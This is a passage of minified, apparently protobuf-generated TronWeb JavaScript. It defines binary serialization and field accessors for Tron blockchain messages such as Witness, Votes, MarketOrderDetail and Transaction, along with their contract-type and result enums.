                return n.Message.addToRepeatedWrapperField(this, 7, e, TronWebProto.Key, t)
            }
            ,
            TronWebProto.Permission.prototype.clearKeysList = function() {
                return this.setKeysList([])
            }
            ,
            n.Message.GENERATE_TO_OBJECT && (TronWebProto.Witness.prototype.toObject = function(e) {
                return TronWebProto.Witness.toObject(e, this)
            }
            ,
            TronWebProto.Witness.toObject = function(e, t) {
                var r = {
                    address: t.getAddress_asB64(),
                    votecount: n.Message.getFieldWithDefault(t, 2, 0),
                    pubkey: t.getPubkey_asB64(),
                    url: n.Message.getFieldWithDefault(t, 4, ""),
                    totalproduced: n.Message.getFieldWithDefault(t, 5, 0),
                    totalmissed: n.Message.getFieldWithDefault(t, 6, 0),
                    latestblocknum: n.Message.getFieldWithDefault(t, 7, 0),
                    latestslotnum: n.Message.getFieldWithDefault(t, 8, 0),
                    isjobs: n.Message.getBooleanFieldWithDefault(t, 9, !1)
                };
                return e && (r.$jspbMessageInstance = t),
                r
            }
            ),
            TronWebProto.Witness.deserializeBinary = function(e) {
                var t = new n.BinaryReader(e)
                  , r = new TronWebProto.Witness;
                return TronWebProto.Witness.deserializeBinaryFromReader(r, t)
            }
            ,
            TronWebProto.Witness.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    switch (t.getFieldNumber()) {
                    case 1:
                        var r = t.readBytes();
                        e.setAddress(r);
                        break;
                    case 2:
                        r = t.readInt64();
                        e.setVotecount(r);
                        break;
                    case 3:
                        r = t.readBytes();
                        e.setPubkey(r);
                        break;
                    case 4:
                        r = t.readString();
                        e.setUrl(r);
                        break;
                    case 5:
                        r = t.readInt64();
                        e.setTotalproduced(r);
                        break;
                    case 6:
                        r = t.readInt64();
                        e.setTotalmissed(r);
                        break;
                    case 7:
                        r = t.readInt64();
                        e.setLatestblocknum(r);
                        break;
                    case 8:
                        r = t.readInt64();
                        e.setLatestslotnum(r);
                        break;
                    case 9:
                        r = t.readBool();
                        e.setIsjobs(r);
                        break;
                    default:
                        t.skipField()
                    }
                }
                return e
            }
            ,
            TronWebProto.Witness.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return TronWebProto.Witness.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            TronWebProto.Witness.serializeBinaryToWriter = function(e, t) {
                var r = void 0;
                (r = e.getAddress_asU8()).length > 0 && t.writeBytes(1, r),
                0 !== (r = e.getVotecount()) && t.writeInt64(2, r),
                (r = e.getPubkey_asU8()).length > 0 && t.writeBytes(3, r),
                (r = e.getUrl()).length > 0 && t.writeString(4, r),
                0 !== (r = e.getTotalproduced()) && t.writeInt64(5, r),
                0 !== (r = e.getTotalmissed()) && t.writeInt64(6, r),
                0 !== (r = e.getLatestblocknum()) && t.writeInt64(7, r),
                0 !== (r = e.getLatestslotnum()) && t.writeInt64(8, r),
                (r = e.getIsjobs()) && t.writeBool(9, r)
            }
            ,
            TronWebProto.Witness.prototype.getAddress = function() {
                return n.Message.getFieldWithDefault(this, 1, "")
            }
            ,
            TronWebProto.Witness.prototype.getAddress_asB64 = function() {
                return n.Message.bytesAsB64(this.getAddress())
            }
            ,
            TronWebProto.Witness.prototype.getAddress_asU8 = function() {
                return n.Message.bytesAsU8(this.getAddress())
            }
            ,
            TronWebProto.Witness.prototype.setAddress = function(e) {
                return n.Message.setProto3BytesField(this, 1, e)
            }
            ,
            TronWebProto.Witness.prototype.getVotecount = function() {
                return n.Message.getFieldWithDefault(this, 2, 0)
            }
            ,
            TronWebProto.Witness.prototype.setVotecount = function(e) {
                return n.Message.setProto3IntField(this, 2, e)
            }
            ,
            TronWebProto.Witness.prototype.getPubkey = function() {
                return n.Message.getFieldWithDefault(this, 3, "")
            }
            ,
            TronWebProto.Witness.prototype.getPubkey_asB64 = function() {
                return n.Message.bytesAsB64(this.getPubkey())
            }
            ,
            TronWebProto.Witness.prototype.getPubkey_asU8 = function() {
                return n.Message.bytesAsU8(this.getPubkey())
            }
            ,
            TronWebProto.Witness.prototype.setPubkey = function(e) {
                return n.Message.setProto3BytesField(this, 3, e)
            }
            ,
            TronWebProto.Witness.prototype.getUrl = function() {
                return n.Message.getFieldWithDefault(this, 4, "")
            }
            ,
            TronWebProto.Witness.prototype.setUrl = function(e) {
                return n.Message.setProto3StringField(this, 4, e)
            }
            ,
            TronWebProto.Witness.prototype.getTotalproduced = function() {
                return n.Message.getFieldWithDefault(this, 5, 0)
            }
            ,
            TronWebProto.Witness.prototype.setTotalproduced = function(e) {
                return n.Message.setProto3IntField(this, 5, e)
            }
            ,
            TronWebProto.Witness.prototype.getTotalmissed = function() {
                return n.Message.getFieldWithDefault(this, 6, 0)
            }
            ,
            TronWebProto.Witness.prototype.setTotalmissed = function(e) {
                return n.Message.setProto3IntField(this, 6, e)
            }
            ,
            TronWebProto.Witness.prototype.getLatestblocknum = function() {
                return n.Message.getFieldWithDefault(this, 7, 0)
            }
            ,
            TronWebProto.Witness.prototype.setLatestblocknum = function(e) {
                return n.Message.setProto3IntField(this, 7, e)
            }
            ,
            TronWebProto.Witness.prototype.getLatestslotnum = function() {
                return n.Message.getFieldWithDefault(this, 8, 0)
            }
            ,
            TronWebProto.Witness.prototype.setLatestslotnum = function(e) {
                return n.Message.setProto3IntField(this, 8, e)
            }
            ,
            TronWebProto.Witness.prototype.getIsjobs = function() {
                return n.Message.getBooleanFieldWithDefault(this, 9, !1)
            }
            ,
            TronWebProto.Witness.prototype.setIsjobs = function(e) {
                return n.Message.setProto3BooleanField(this, 9, e)
            }
            ,
            TronWebProto.Votes.repeatedFields_ = [2, 3],
            n.Message.GENERATE_TO_OBJECT && (TronWebProto.Votes.prototype.toObject = function(e) {
                return TronWebProto.Votes.toObject(e, this)
            }
            ,
            TronWebProto.Votes.toObject = function(e, t) {
                var r = {
                    address: t.getAddress_asB64(),
                    oldVotesList: n.Message.toObjectList(t.getOldVotesList(), TronWebProto.Vote.toObject, e),
                    newVotesList: n.Message.toObjectList(t.getNewVotesList(), TronWebProto.Vote.toObject, e)
                };
                return e && (r.$jspbMessageInstance = t),
                r
            }
            ),
            TronWebProto.Votes.deserializeBinary = function(e) {
                var t = new n.BinaryReader(e)
                  , r = new TronWebProto.Votes;
                return TronWebProto.Votes.deserializeBinaryFromReader(r, t)
            }
            ,
            TronWebProto.Votes.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    switch (t.getFieldNumber()) {
                    case 1:
                        var r = t.readBytes();
                        e.setAddress(r);
                        break;
                    case 2:
                        r = new TronWebProto.Vote;
                        t.readMessage(r, TronWebProto.Vote.deserializeBinaryFromReader),
                        e.addOldVotes(r);
                        break;
                    case 3:
                        r = new TronWebProto.Vote;
                        t.readMessage(r, TronWebProto.Vote.deserializeBinaryFromReader),
                        e.addNewVotes(r);
                        break;
                    default:
                        t.skipField()
                    }
                }
                return e
            }
            ,
            TronWebProto.Votes.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return TronWebProto.Votes.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            TronWebProto.Votes.serializeBinaryToWriter = function(e, t) {
                var r = void 0;
                (r = e.getAddress_asU8()).length > 0 && t.writeBytes(1, r),
                (r = e.getOldVotesList()).length > 0 && t.writeRepeatedMessage(2, r, TronWebProto.Vote.serializeBinaryToWriter),
                (r = e.getNewVotesList()).length > 0 && t.writeRepeatedMessage(3, r, TronWebProto.Vote.serializeBinaryToWriter)
            }
            ,
            TronWebProto.Votes.prototype.getAddress = function() {
                return n.Message.getFieldWithDefault(this, 1, "")
            }
            ,
            TronWebProto.Votes.prototype.getAddress_asB64 = function() {
                return n.Message.bytesAsB64(this.getAddress())
            }
            ,
            TronWebProto.Votes.prototype.getAddress_asU8 = function() {
                return n.Message.bytesAsU8(this.getAddress())
            }
            ,
            TronWebProto.Votes.prototype.setAddress = function(e) {
                return n.Message.setProto3BytesField(this, 1, e)
            }
            ,
            TronWebProto.Votes.prototype.getOldVotesList = function() {
                return n.Message.getRepeatedWrapperField(this, TronWebProto.Vote, 2)
            }
            ,
            TronWebProto.Votes.prototype.setOldVotesList = function(e) {
                return n.Message.setRepeatedWrapperField(this, 2, e)
            }
            ,
            TronWebProto.Votes.prototype.addOldVotes = function(e, t) {
                return n.Message.addToRepeatedWrapperField(this, 2, e, TronWebProto.Vote, t)
            }
            ,
            TronWebProto.Votes.prototype.clearOldVotesList = function() {
                return this.setOldVotesList([])
            }
            ,
            TronWebProto.Votes.prototype.getNewVotesList = function() {
                return n.Message.getRepeatedWrapperField(this, TronWebProto.Vote, 3)
            }
            ,
            TronWebProto.Votes.prototype.setNewVotesList = function(e) {
                return n.Message.setRepeatedWrapperField(this, 3, e)
            }
            ,
            TronWebProto.Votes.prototype.addNewVotes = function(e, t) {
                return n.Message.addToRepeatedWrapperField(this, 3, e, TronWebProto.Vote, t)
            }
            ,
            TronWebProto.Votes.prototype.clearNewVotesList = function() {
                return this.setNewVotesList([])
            }
            ,
            n.Message.GENERATE_TO_OBJECT && (TronWebProto.MarketOrderDetail.prototype.toObject = function(e) {
                return TronWebProto.MarketOrderDetail.toObject(e, this)
            }
            ,
            TronWebProto.MarketOrderDetail.toObject = function(e, t) {
                var r = {
                    makerorderid: t.getMakerorderid_asB64(),
                    takerorderid: t.getTakerorderid_asB64(),
                    fillsellquantity: n.Message.getFieldWithDefault(t, 3, 0),
                    fillbuyquantity: n.Message.getFieldWithDefault(t, 4, 0)
                };
                return e && (r.$jspbMessageInstance = t),
                r
            }
            ),
            TronWebProto.MarketOrderDetail.deserializeBinary = function(e) {
                var t = new n.BinaryReader(e)
                  , r = new TronWebProto.MarketOrderDetail;
                return TronWebProto.MarketOrderDetail.deserializeBinaryFromReader(r, t)
            }
            ,
            TronWebProto.MarketOrderDetail.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    switch (t.getFieldNumber()) {
                    case 1:
                        var r = t.readBytes();
                        e.setMakerorderid(r);
                        break;
                    case 2:
                        r = t.readBytes();
                        e.setTakerorderid(r);
                        break;
                    case 3:
                        r = t.readInt64();
                        e.setFillsellquantity(r);
                        break;
                    case 4:
                        r = t.readInt64();
                        e.setFillbuyquantity(r);
                        break;
                    default:
                        t.skipField()
                    }
                }
                return e
            }
            ,
            TronWebProto.MarketOrderDetail.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return TronWebProto.MarketOrderDetail.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            TronWebProto.MarketOrderDetail.serializeBinaryToWriter = function(e, t) {
                var r = void 0;
                (r = e.getMakerorderid_asU8()).length > 0 && t.writeBytes(1, r),
                (r = e.getTakerorderid_asU8()).length > 0 && t.writeBytes(2, r),
                0 !== (r = e.getFillsellquantity()) && t.writeInt64(3, r),
                0 !== (r = e.getFillbuyquantity()) && t.writeInt64(4, r)
            }
            ,
            TronWebProto.MarketOrderDetail.prototype.getMakerorderid = function() {
                return n.Message.getFieldWithDefault(this, 1, "")
            }
            ,
            TronWebProto.MarketOrderDetail.prototype.getMakerorderid_asB64 = function() {
                return n.Message.bytesAsB64(this.getMakerorderid())
            }
            ,
            TronWebProto.MarketOrderDetail.prototype.getMakerorderid_asU8 = function() {
                return n.Message.bytesAsU8(this.getMakerorderid())
            }
            ,
            TronWebProto.MarketOrderDetail.prototype.setMakerorderid = function(e) {
                return n.Message.setProto3BytesField(this, 1, e)
            }
            ,
            TronWebProto.MarketOrderDetail.prototype.getTakerorderid = function() {
                return n.Message.getFieldWithDefault(this, 2, "")
            }
            ,
            TronWebProto.MarketOrderDetail.prototype.getTakerorderid_asB64 = function() {
                return n.Message.bytesAsB64(this.getTakerorderid())
            }
            ,
            TronWebProto.MarketOrderDetail.prototype.getTakerorderid_asU8 = function() {
                return n.Message.bytesAsU8(this.getTakerorderid())
            }
            ,
            TronWebProto.MarketOrderDetail.prototype.setTakerorderid = function(e) {
                return n.Message.setProto3BytesField(this, 2, e)
            }
            ,
            TronWebProto.MarketOrderDetail.prototype.getFillsellquantity = function() {
                return n.Message.getFieldWithDefault(this, 3, 0)
            }
            ,
            TronWebProto.MarketOrderDetail.prototype.setFillsellquantity = function(e) {
                return n.Message.setProto3IntField(this, 3, e)
            }
            ,
            TronWebProto.MarketOrderDetail.prototype.getFillbuyquantity = function() {
                return n.Message.getFieldWithDefault(this, 4, 0)
            }
            ,
            TronWebProto.MarketOrderDetail.prototype.setFillbuyquantity = function(e) {
                return n.Message.setProto3IntField(this, 4, e)
            }
            ,
            TronWebProto.Transaction.repeatedFields_ = [2, 5],
            n.Message.GENERATE_TO_OBJECT && (TronWebProto.Transaction.prototype.toObject = function(e) {
                return TronWebProto.Transaction.toObject(e, this)
            }
            ,
            TronWebProto.Transaction.toObject = function(e, t) {
                var r, o = {
                    rawData: (r = t.getRawData()) && TronWebProto.Transaction.raw.toObject(e, r),
                    signatureList: t.getSignatureList_asB64(),
                    retList: n.Message.toObjectList(t.getRetList(), TronWebProto.Transaction.Result.toObject, e)
                };
                return e && (o.$jspbMessageInstance = t),
                o
            }
            ),
            TronWebProto.Transaction.deserializeBinary = function(e) {
                var t = new n.BinaryReader(e)
                  , r = new TronWebProto.Transaction;
                return TronWebProto.Transaction.deserializeBinaryFromReader(r, t)
            }
            ,
            TronWebProto.Transaction.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    switch (t.getFieldNumber()) {
                    case 1:
                        var r = new TronWebProto.Transaction.raw;
                        t.readMessage(r, TronWebProto.Transaction.raw.deserializeBinaryFromReader),
                        e.setRawData(r);
                        break;
                    case 2:
                        r = t.readBytes();
                        e.addSignature(r);
                        break;
                    case 5:
                        r = new TronWebProto.Transaction.Result;
                        t.readMessage(r, TronWebProto.Transaction.Result.deserializeBinaryFromReader),
                        e.addRet(r);
                        break;
                    default:
                        t.skipField()
                    }
                }
                return e
            }
            ,
            TronWebProto.Transaction.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return TronWebProto.Transaction.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            TronWebProto.Transaction.serializeBinaryToWriter = function(e, t) {
                var r = void 0;
                null != (r = e.getRawData()) && t.writeMessage(1, r, TronWebProto.Transaction.raw.serializeBinaryToWriter),
                (r = e.getSignatureList_asU8()).length > 0 && t.writeRepeatedBytes(2, r),
                (r = e.getRetList()).length > 0 && t.writeRepeatedMessage(5, r, TronWebProto.Transaction.Result.serializeBinaryToWriter)
            }
            ,
            n.Message.GENERATE_TO_OBJECT && (TronWebProto.Transaction.Contract.prototype.toObject = function(e) {
                return TronWebProto.Transaction.Contract.toObject(e, this)
            }
            ,
            TronWebProto.Transaction.Contract.toObject = function(e, t) {
                var r, o = {
                    type: n.Message.getFieldWithDefault(t, 1, 0),
                    parameter: (r = t.getParameter()) && s.Any.toObject(e, r),
                    provider: t.getProvider_asB64(),
                    contractname: t.getContractname_asB64(),
                    permissionId: n.Message.getFieldWithDefault(t, 5, 0)
                };
                return e && (o.$jspbMessageInstance = t),
                o
            }
            ),
            TronWebProto.Transaction.Contract.deserializeBinary = function(e) {
                var t = new n.BinaryReader(e)
                  , r = new TronWebProto.Transaction.Contract;
                return TronWebProto.Transaction.Contract.deserializeBinaryFromReader(r, t)
            }
            ,
            TronWebProto.Transaction.Contract.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    switch (t.getFieldNumber()) {
                    case 1:
                        var r = t.readEnum();
                        e.setType(r);
                        break;
                    case 2:
                        r = new s.Any;
                        t.readMessage(r, s.Any.deserializeBinaryFromReader),
                        e.setParameter(r);
                        break;
                    case 3:
                        r = t.readBytes();
                        e.setProvider(r);
                        break;
                    case 4:
                        r = t.readBytes();
                        e.setContractname(r);
                        break;
                    case 5:
                        r = t.readInt32();
                        e.setPermissionId(r);
                        break;
                    default:
                        t.skipField()
                    }
                }
                return e
            }
            ,
            TronWebProto.Transaction.Contract.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return TronWebProto.Transaction.Contract.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            TronWebProto.Transaction.Contract.serializeBinaryToWriter = function(e, t) {
                var r = void 0;
                0 !== (r = e.getType()) && t.writeEnum(1, r),
                null != (r = e.getParameter()) && t.writeMessage(2, r, s.Any.serializeBinaryToWriter),
                (r = e.getProvider_asU8()).length > 0 && t.writeBytes(3, r),
                (r = e.getContractname_asU8()).length > 0 && t.writeBytes(4, r),
                0 !== (r = e.getPermissionId()) && t.writeInt32(5, r)
            }
            ,
            TronWebProto.Transaction.Contract.ContractType = {
                ACCOUNTCREATECONTRACT: 0,
                TRANSFERCONTRACT: 1,
                TRANSFERASSETCONTRACT: 2,
                VOTEASSETCONTRACT: 3,
                VOTEWITNESSCONTRACT: 4,
                WITNESSCREATECONTRACT: 5,
                ASSETISSUECONTRACT: 6,
                WITNESSUPDATECONTRACT: 8,
                PARTICIPATEASSETISSUECONTRACT: 9,
                ACCOUNTUPDATECONTRACT: 10,
                FREEZEBALANCECONTRACT: 11,
                UNFREEZEBALANCECONTRACT: 12,
                WITHDRAWBALANCECONTRACT: 13,
                UNFREEZEASSETCONTRACT: 14,
                UPDATEASSETCONTRACT: 15,
                PROPOSALCREATECONTRACT: 16,
                PROPOSALAPPROVECONTRACT: 17,
                PROPOSALDELETECONTRACT: 18,
                SETACCOUNTIDCONTRACT: 19,
                CUSTOMCONTRACT: 20,
                CREATESMARTCONTRACT: 30,
                TRIGGERSMARTCONTRACT: 31,
                GETCONTRACT: 32,
                UPDATESETTINGCONTRACT: 33,
                EXCHANGECREATECONTRACT: 41,
                EXCHANGEINJECTCONTRACT: 42,
                EXCHANGEWITHDRAWCONTRACT: 43,
                EXCHANGETRANSACTIONCONTRACT: 44,
                UPDATEENERGYLIMITCONTRACT: 45,
                ACCOUNTPERMISSIONUPDATECONTRACT: 46,
                CLEARABICONTRACT: 48,
                UPDATEBROKERAGECONTRACT: 49,
                SHIELDEDTRANSFERCONTRACT: 51,
                MARKETSELLASSETCONTRACT: 52,
                MARKETCANCELORDERCONTRACT: 53,
                FREEZEBALANCEV2CONTRACT: 54,
                UNFREEZEBALANCEV2CONTRACT: 55,
                WITHDRAWEXPIREUNFREEZECONTRACT: 56,
                DELEGATERESOURCECONTRACT: 57,
                UNDELEGATERESOURCECONTRACT: 58,
                CANCELALLUNFREEZEV2CONTRACT: 59
            },
            TronWebProto.Transaction.Contract.prototype.getType = function() {
                return n.Message.getFieldWithDefault(this, 1, 0)
            }
            ,
            TronWebProto.Transaction.Contract.prototype.setType = function(e) {
                return n.Message.setProto3EnumField(this, 1, e)
            }
            ,
            TronWebProto.Transaction.Contract.prototype.getParameter = function() {
                return n.Message.getWrapperField(this, s.Any, 2)
            }
            ,
            TronWebProto.Transaction.Contract.prototype.setParameter = function(e) {
                return n.Message.setWrapperField(this, 2, e)
            }
            ,
            TronWebProto.Transaction.Contract.prototype.clearParameter = function() {
                return this.setParameter(void 0)
            }
            ,
            TronWebProto.Transaction.Contract.prototype.hasParameter = function() {
                return null != n.Message.getField(this, 2)
            }
            ,
            TronWebProto.Transaction.Contract.prototype.getProvider = function() {
                return n.Message.getFieldWithDefault(this, 3, "")
            }
            ,
            TronWebProto.Transaction.Contract.prototype.getProvider_asB64 = function() {
                return n.Message.bytesAsB64(this.getProvider())
            }
            ,
            TronWebProto.Transaction.Contract.prototype.getProvider_asU8 = function() {
                return n.Message.bytesAsU8(this.getProvider())
            }
            ,
            TronWebProto.Transaction.Contract.prototype.setProvider = function(e) {
                return n.Message.setProto3BytesField(this, 3, e)
            }
            ,
            TronWebProto.Transaction.Contract.prototype.getContractname = function() {
                return n.Message.getFieldWithDefault(this, 4, "")
            }
            ,
            TronWebProto.Transaction.Contract.prototype.getContractname_asB64 = function() {
                return n.Message.bytesAsB64(this.getContractname())
            }
            ,
            TronWebProto.Transaction.Contract.prototype.getContractname_asU8 = function() {
                return n.Message.bytesAsU8(this.getContractname())
            }
            ,
            TronWebProto.Transaction.Contract.prototype.setContractname = function(e) {
                return n.Message.setProto3BytesField(this, 4, e)
            }
            ,
            TronWebProto.Transaction.Contract.prototype.getPermissionId = function() {
                return n.Message.getFieldWithDefault(this, 5, 0)
            }
            ,
            TronWebProto.Transaction.Contract.prototype.setPermissionId = function(e) {
                return n.Message.setProto3IntField(this, 5, e)
            }
            ,
            TronWebProto.Transaction.Result.repeatedFields_ = [26],
            n.Message.GENERATE_TO_OBJECT && (TronWebProto.Transaction.Result.prototype.toObject = function(e) {
                return TronWebProto.Transaction.Result.toObject(e, this)
            }
            ,
            TronWebProto.Transaction.Result.toObject = function(e, t) {
                var r = {
                    fee: n.Message.getFieldWithDefault(t, 1, 0),
                    ret: n.Message.getFieldWithDefault(t, 2, 0),
                    contractret: n.Message.getFieldWithDefault(t, 3, 0),
                    assetissueid: n.Message.getFieldWithDefault(t, 14, ""),
                    withdrawAmount: n.Message.getFieldWithDefault(t, 15, 0),
                    unfreezeAmount: n.Message.getFieldWithDefault(t, 16, 0),
                    exchangeReceivedAmount: n.Message.getFieldWithDefault(t, 18, 0),
                    exchangeInjectAnotherAmount: n.Message.getFieldWithDefault(t, 19, 0),
                    exchangeWithdrawAnotherAmount: n.Message.getFieldWithDefault(t, 20, 0),
                    exchangeId: n.Message.getFieldWithDefault(t, 21, 0),
                    shieldedTransactionFee: n.Message.getFieldWithDefault(t, 22, 0),
                    orderid: t.getOrderid_asB64(),
                    orderdetailsList: n.Message.toObjectList(t.getOrderdetailsList(), TronWebProto.MarketOrderDetail.toObject, e)
                };
                return e && (r.$jspbMessageInstance = t),
                r
            }
            ),
            TronWebProto.Transaction.Result.deserializeBinary = function(e) {
                var t = new n.BinaryReader(e)
                  , r = new TronWebProto.Transaction.Result;
                return TronWebProto.Transaction.Result.deserializeBinaryFromReader(r, t)
            }
            ,
            TronWebProto.Transaction.Result.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    switch (t.getFieldNumber()) {
                    case 1:
                        var r = t.readInt64();
                        e.setFee(r);
                        break;
                    case 2:
                        r = t.readEnum();
                        e.setRet(r);
                        break;
                    case 3:
                        r = t.readEnum();
                        e.setContractret(r);
                        break;
                    case 14:
                        r = t.readString();
                        e.setAssetissueid(r);
                        break;
                    case 15:
                        r = t.readInt64();
                        e.setWithdrawAmount(r);
                        break;
                    case 16:
                        r = t.readInt64();
                        e.setUnfreezeAmount(r);
                        break;
                    case 18:
                        r = t.readInt64();
                        e.setExchangeReceivedAmount(r);
                        break;
                    case 19:
                        r = t.readInt64();
                        e.setExchangeInjectAnotherAmount(r);
                        break;
                    case 20:
                        r = t.readInt64();
                        e.setExchangeWithdrawAnotherAmount(r);
                        break;
                    case 21:
                        r = t.readInt64();
                        e.setExchangeId(r);
                        break;
                    case 22:
                        r = t.readInt64();
                        e.setShieldedTransactionFee(r);
                        break;
                    case 25:
                        r = t.readBytes();
                        e.setOrderid(r);
                        break;
                    case 26:
                        r = new TronWebProto.MarketOrderDetail;
                        t.readMessage(r, TronWebProto.MarketOrderDetail.deserializeBinaryFromReader),
                        e.addOrderdetails(r);
                        break;
                    default:
                        t.skipField()
                    }
                }
                return e
            }
            ,
            TronWebProto.Transaction.Result.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return TronWebProto.Transaction.Result.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            TronWebProto.Transaction.Result.serializeBinaryToWriter = function(e, t) {
                var r = void 0;
                0 !== (r = e.getFee()) && t.writeInt64(1, r),
                0 !== (r = e.getRet()) && t.writeEnum(2, r),
                0 !== (r = e.getContractret()) && t.writeEnum(3, r),
                (r = e.getAssetissueid()).length > 0 && t.writeString(14, r),
                0 !== (r = e.getWithdrawAmount()) && t.writeInt64(15, r),
                0 !== (r = e.getUnfreezeAmount()) && t.writeInt64(16, r),
                0 !== (r = e.getExchangeReceivedAmount()) && t.writeInt64(18, r),
                0 !== (r = e.getExchangeInjectAnotherAmount()) && t.writeInt64(19, r),
                0 !== (r = e.getExchangeWithdrawAnotherAmount()) && t.writeInt64(20, r),
                0 !== (r = e.getExchangeId()) && t.writeInt64(21, r),
                0 !== (r = e.getShieldedTransactionFee()) && t.writeInt64(22, r),
                (r = e.getOrderid_asU8()).length > 0 && t.writeBytes(25, r),
                (r = e.getOrderdetailsList()).length > 0 && t.writeRepeatedMessage(26, r, TronWebProto.MarketOrderDetail.serializeBinaryToWriter)
            }
            ,
            TronWebProto.Transaction.Result.code = {
                SUCESS: 0,
                FAILED: 1
            },
            TronWebProto.Transaction.Result.contractResult = {
                DEFAULT: 0,
                SUCCESS: 1,
                REVERT: 2,
                BAD_JUMP_DESTINATION: 3,
                OUT_OF_MEMORY: 4,
                PRECOMPILED_CONTRACT: 5,
                STACK_TOO_SMALL: 6,
                STACK_TOO_LARGE: 7,
                ILLEGAL_OPERATION: 8,
                STACK_OVERFLOW: 9,
                OUT_OF_ENERGY: 10,
                OUT_OF_TIME: 11,
                JVM_STACK_OVER_FLOW: 12,
                UNKNOWN: 13,
                TRANSFER_FAILED: 14,
                INVALID_CODE: 15
            },
            TronWebProto.Transaction.Result.prototype.getFee = function() {
                return n.Message.getFieldWithDefault(this, 1, 0)
            }
            ,
            TronWebProto.Transaction.Result.prototype.setFee = function(e) {
                return n.Message.setProto3IntField(this, 1, e)
            }
            ,
            TronWebProto.Transaction.Result.prototype.getRet = function() {
                return n.Message.getFieldWithDefault(this, 2, 0)
            }
            ,
            TronWebProto.Transaction.Result.prototype.setRet = function(e) {
                return n.Message.setProto3EnumField(this, 2, e)
            }
            ,
            TronWebProto.Transaction.Result.prototype.getContractret = function() {
                return n.Message.getFieldWithDefault(this, 3, 0)
            }
            ,
            TronWebProto.Transaction.Result.prototype.setContractret = function(e) {
                return n.Message.setProto3EnumField(this, 3, e)
            }
            ,
            TronWebProto.Transaction.Result.prototype.getAssetissueid = function() {
                return n.Message.getFieldWithDefault(this, 14, "")
            }
            ,
            TronWebProto.Transaction.Result.prototype.setAssetissueid = function(e) {
                return n.Message.setProto3StringField(this, 14, e)
            }
            ,
            TronWebProto.Transaction.Result.prototype.getWithdrawAmount = function() {
                return n.Message.getFieldWithDefault(this, 15, 0)
            }
            ,
            TronWebProto.Transaction.Result.prototype.setWithdrawAmount = function(e) {
                return n.Message.setProto3IntField(this, 15, e)
            }
            ,
            TronWebProto.Transaction.Result.prototype.getUnfreezeAmount = function() {
                return n.Message.getFieldWithDefault(this, 16, 0)
            }
            ,
            TronWebProto.Transaction.Result.prototype.setUnfreezeAmount = function(e) {
                return n.Message.setProto3IntField(this, 16, e)
            }
            ,
            TronWebProto.Transaction.Result.prototype.getExchangeReceivedAmount = function() {
                return n.Message.getFieldWithDefault(this, 18, 0)
            }
            ,
            TronWebProto.Transaction.Result.prototype.setExchangeReceivedAmount = function(e) {
                return n.Message.setProto3IntField(this, 18, e)
            }
            ,
            TronWebProto.Transaction.Result.prototype.getExchangeInjectAnotherAmount = function() {
                return n.Message.getFieldWithDefault(this, 19, 0)
            }
            ,
            TronWebProto.Transaction.Result.prototype.setExchangeInjectAnotherAmount = function(e) {
                return n.Message.setProto3IntField(this, 19, e)
            }
            ,
            TronWebProto.Transaction.Result.prototype.getExchangeWithdrawAnotherAmount = function() {
                return n.Message.getFieldWithDefault(this, 20, 0)
            }
            ,
            TronWebProto.Transaction.Result.prototype.setExchangeWithdrawAnotherAmount = function(e) {
                return n.Message.setProto3IntField(this, 20, e)
            }
            ,
            TronWebProto.Transaction.Result.prototype.getExchangeId = function() {
                return n.Message.getFieldWithDefault(this, 21, 0)
            }
            ,
            TronWebProto.Transaction.Result.prototype.setExchangeId = function(e) {
                return n.Message.setProto3IntField(this, 21, e)
            }
            ,
            TronWebProto.Transaction.Result.prototype.getShieldedTransactionFee = function() {
                return n.Message.getFieldWithDefault(this, 22, 0)
            }
            ,
            TronWebProto.Transaction.Result.prototype.setShieldedTransactionFee = function(e) {
                return n.Message.setProto3IntField(this, 22, e)
            }
            ,
            TronWebProto.Transaction.Result.prototype.getOrderid = function() {
                return n.Message.getFieldWithDefault(this, 25, "")
            }
            ,
            TronWebProto.Transaction.Result.prototype.getOrderid_asB64 = function() {
                return n.Message.bytesAsB64(this.getOrderid())
            }
            ,
            TronWebProto.Transaction.Result.prototype.getOrderid_asU8 = function() {
                return n.Message.bytesAsU8(this.getOrderid())
            }
            ,
            TronWebProto.Transaction.Result.prototype.setOrderid = function(e) {
                return n.Message.setProto3BytesField(this, 25, e)
            }
            ,
            TronWebProto.Transaction.Result.prototype.getOrderdetailsList = function() {
                return n.Message.getRepeatedWrapperField(this, TronWebProto.MarketOrderDetail, 26)
            }
            ,
            TronWebProto.Transaction.Result.prototype.setOrderdetailsList = function(e) {
                return n.Message.setRepeatedWrapperField(this, 26, e)
            }
            ,
            TronWebProto.Transaction.Result.prototype.addOrderdetails = function(e, t) {
                return n.Message.addToRepeatedWrapperField(this, 26, e, TronWebProto.MarketOrderDetail, t)
            }
            ,
            TronWebProto.Transaction.Result.prototype.clearOrderdetailsList = function() {
                return this.setOrderdetailsList([])
            }
            ,
            TronWebProto.Transaction.raw.repeatedFields_ = [9, 11],
            n.Message.GENERATE_TO_OBJECT && (TronWebProto.Transaction.raw.prototype.toObject = function(e) {
                return TronWebProto.Transaction.raw.toObject(e, this)
            }
            ,
            TronWebProto.Transaction.raw.toObject = function(e, t) {
                var r = {
                    refBlockBytes: t.getRefBlockBytes_asB64(),
                    refBlockNum: n.Message.getFieldWithDefault(t, 3, 0),
                    refBlockHash: t.getRefBlockHash_asB64(),
